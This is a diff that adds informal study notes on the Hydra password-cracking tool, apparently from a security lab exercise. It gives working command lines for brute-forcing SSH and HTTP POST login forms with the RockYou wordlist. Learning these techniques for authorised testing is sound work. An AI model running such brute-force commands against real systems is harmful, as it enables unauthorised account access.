@@ -1,0 +1,17 @@
+sudo hydra -l "BTHub*****" -P Rockyou.txt (host pcs ip) ssh(Service type)
+
+RockYou.txt : list of lots of passwords it may be
+
+F=incorrect		what word hydra uses to know if the attempt was sucsessful (e.g "incorrect")
+
+================================
+Examples:
+
+
+Below is a more concrete example Hydra command to brute force a POST login form: (http)
+
+hydra -l <username> -P <wordlist> 10.10.71.217 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+brute force a SSH password:
+
+ hydra -l <Username> -P /usr/share/wordlists/rockyou.txt <IP ADDR> ssh
